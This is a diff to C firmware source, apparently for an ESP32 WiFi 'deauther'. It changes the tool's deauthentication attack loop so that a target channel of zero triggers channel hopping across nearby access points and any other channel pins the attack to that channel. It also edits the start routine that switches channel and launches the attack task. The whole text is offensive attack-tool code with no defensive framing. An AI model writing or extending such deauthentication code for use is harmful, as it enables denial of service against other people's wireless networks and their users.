@@ -266,24 +266,30 @@ void deauther_send_frames(const target_info_t *target, deauther_attack_type_t at
         for (int i = 0; i < aps.count; i++) 
         {
             if(!deauther_running) break;
-
             uint8_t ch = aps.ap[i].record.primary;
             int8_t rssi = aps.ap[i].record.rssi;
-
             /* Skip if rssi is too low */
             if(rssi < AP_RSSI_THRESHOLD) {
                 continue;
             }
 
-            bool exists = false;
-            for (int k = 0; k < num_channels; k++) {
-                if (target_channels[k] == ch) {
-                    exists = true; 
-                    break;
+            /* channel 0 means channel hopping */
+            if(target->channel == 0) {
+                bool exists = false;
+                for (int k = 0; k < num_channels; k++) {
+                    if (target_channels[k] == ch) {
+                        exists = true; 
+                        break;
+                    }
+                }
+                if (!exists) {
+                    target_channels[num_channels++] = ch;
                 }
             }
-            if (!exists) {
-                target_channels[num_channels++] = ch;
+            else {
+                target_channels[0] = target->channel;
+                num_channels = 1;
+                break;
             }
         }
 
@@ -307,20 +313,26 @@ void deauther_send_frames(const target_info_t *target, deauther_attack_type_t at
                         execute_attack_on_target(aps.ap[i].record.bssid, (const char*)aps.ap[i].record.ssid, current_ch, attack_type);
                     }
                 }
-                if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) {
-                    /* Need more time on this channel to send to all aps */
-                    vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
-                    wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
-                    vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
-                    start_time = esp_timer_get_time();
-                };
+                /* channel 0 means channel hopping */
+                if((target->channel == 0)) {
+                    if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) {
+                        /* Need more time on this channel to send to all aps */
+                        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
+                        wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+                        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
+                        start_time = esp_timer_get_time();
+                    };
+                }
             }
-            int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
-            if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
-                vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
+            /* channel 0 means channel hopping */
+            if((target->channel == 0)) {
+                int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
+                if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
+                    vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
+                }
+                /* Wait some time to permit the AP to communicate on his own channel */
+                vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
             }
-            /* Wait some time to permit the AP to communicate on his own channel */
-            vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
         }
     }
     // --- MODALITÀ SINGLE TARGET ---
@@ -397,10 +409,13 @@ void deauther_start(const target_info_t *deauth_target, deauther_attack_type_t a
     target_set(deauth_target, TARGET_INFO_DEAUTHER);
 
     /* Switch channel */
-    bool broadcast_target = isMacBroadcast(deauth_target->bssid);
-    if(!broadcast_target) {
+    if(deauth_target->channel != 0){
         wifi_switch_ap_channel_csa(deauth_target->channel);
     }
+    // bool broadcast_target = isMacBroadcast(deauth_target->bssid);
+    // if(!broadcast_target) {
+    //     wifi_switch_ap_channel_csa(deauth_target->channel);
+    // }
 
     task_manager_create_task(deauther_task, "deauther_task", 4096, NULL, DEAUTHER_TASK_PRIO, &deauther_task_handle);
     ESP_LOGI(TAG, "Deauth Attack Started.");
